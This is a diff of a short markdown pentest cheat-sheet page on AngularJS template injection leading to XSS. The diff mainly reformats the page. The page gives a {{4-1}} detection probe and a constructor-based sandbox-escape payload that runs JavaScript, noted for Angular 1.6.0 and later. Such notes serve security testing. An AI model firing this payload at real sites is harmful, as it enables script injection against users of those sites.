@@ -1,18 +1,18 @@
 # Angular XSS via TJ template injection
 
-## XSS via Angular TJ template injection <a id="via-angulattj-template-injection"></a>
+## XSS via Angular TJ template injection <a href="#via-angulattj-template-injection" id="via-angulattj-template-injection"></a>
 
 `payload = {{4-1}}`
 
-**→ if response = {{4-1}} &gt; not vulnerable  
-→ if response = 3 -&gt; template injection !**
+**→ if response = \{{4-1\}} > not vulnerable**\
+**→ if response = 3 -> template injection !**
 
-`payload = {{constructor.constructor('alert("XSSSS")')()}}`  
- 
+`payload = {{constructor.constructor('alert("XSSSS")')()}}`\
+&#x20;
 
-#### note **** = must be angular &gt;= 1.6.0
+#### note  = must be angular >= 1.6.0
 
-Older \(see portswigger link\)
+Older (see portswigger link)
 
 ![](../../../.gitbook/assets/54e9e5bef36c4f4eac4d855db9c7cc40.png)
 
@@ -23,4 +23,3 @@ Older \(see portswigger link\)
 * Check Angular version :
 
 `console / angular.version`
-
